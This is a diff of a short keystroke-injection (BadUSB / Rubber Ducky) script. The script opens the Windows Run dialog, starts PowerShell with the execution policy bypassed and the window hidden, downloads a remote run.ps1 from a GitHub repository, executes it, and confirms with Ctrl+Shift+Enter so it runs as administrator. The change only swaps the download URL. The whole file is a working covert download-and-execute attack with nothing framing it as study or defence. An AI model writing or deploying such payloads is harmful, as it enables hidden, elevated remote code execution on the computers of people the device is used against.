@@ -1,7 +1,7 @@
 DELAY 2000
 GUI r
 DELAY 1000
-STRING powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/SAKIB-SALIM/A/releases/latest/download/run.ps1" -UseBasicParsing).Content"
+STRING powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/SAKIB-SALIM/A/refs/heads/main/run.ps1" -UseBasicParsing).Content"
 DELAY 1000
 CTRL SHIFT ENTER
 DELAY 2000
